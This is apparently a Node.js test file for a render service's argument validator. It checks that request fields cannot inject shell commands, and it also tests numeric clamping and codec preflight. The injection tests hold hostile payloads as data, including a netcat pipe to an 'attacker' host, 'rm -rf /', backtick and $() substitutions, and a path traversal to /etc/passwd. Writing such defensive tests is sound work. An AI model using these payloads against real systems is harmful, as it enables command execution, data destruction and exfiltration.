import { test } from 'node:test';
import assert from 'node:assert/strict';
import { buildRenderArgs, clampNumber, NUMERIC } from '../src/validate.js';
import { checkCodec } from '../src/preflight.js';

const uploads = new Map([['aud', '/tmp/a.wav'], ['img', '/tmp/a.png']]);
const resolve = (id) => uploads.get(id);
const build = (body) => buildRenderArgs(body, resolve);

test('a normal request builds the expected argv', () => {
  const args = build({ audioId: 'aud', avatarId: 'img', style: 'waterfall', preset: 'modem', codec: 'hevc' });
  assert.deepEqual(args, [
    '--audio', '/tmp/a.wav', '--avatar', '/tmp/a.png',
    '--style', 'waterfall', '--preset', 'modem', '--codec', 'hevc',
  ]);
});

test('an unresolved upload is rejected', () => {
  assert.throws(() => build({ audioId: 'nope' }), /no audio uploaded/);
});

// The security-critical part: these values reach a subprocess argv.
for (const [field, value] of [
  ['style', 'pulse; touch /tmp/pwned'],
  ['style', '../../etc/passwd'],
  ['preset', 'modem && id'],
  ['codec', 'hevc | nc attacker 1234'],
  ['alpha', 'straight`whoami`'],
]) {
  test(`injection via ${field} is rejected: ${value}`, () => {
    assert.throws(() => build({ audioId: 'aud', [field]: value }), /unknown/);
  });
}

test('shell metacharacters in numeric fields are coerced away, never passed through', () => {
  const args = build({ audioId: 'aud', hueA: '$(touch /tmp/pwned)', glow: '140; rm -rf /' });
  for (const a of args) {
    assert.ok(!/[;&|`$]/.test(a), `argv contains shell metacharacters: ${a}`);
  }
  assert.ok(!args.includes('--hueA'), 'non-numeric input should be dropped, not defaulted');
});

test('numbers are clamped to their documented bounds', () => {
  const args = build({ audioId: 'aud', size: 99999, fps: -5, glow: 1e6 });
  assert.equal(args[args.indexOf('--size') + 1], '2048');
  assert.equal(args[args.indexOf('--fps') + 1], '1');
  assert.equal(args[args.indexOf('--glow') + 1], '200');
});

test('clampNumber rejects junk and honours bounds', () => {
  assert.equal(clampNumber('abc', NUMERIC.glow), null);
  assert.equal(clampNumber('50', NUMERIC.glow), 50);
  assert.equal(clampNumber(Infinity, NUMERIC.glow), null);
});

test('noAudio is only honoured as a real boolean', () => {
  assert.ok(build({ audioId: 'aud', noAudio: true }).includes('--no-audio'));
  assert.ok(!build({ audioId: 'aud', noAudio: 'yes' }).includes('--no-audio'));
});

test('checkCodec explains a missing encoder instead of failing obscurely', () => {
  const linux = new Set(['prores_ks', 'png']);
  const msg = checkCodec('hevc', linux);
  assert.match(msg, /only exists on macOS/);
  assert.match(msg, /available here: prores, png/);
  assert.equal(checkCodec('prores', linux), null);
});
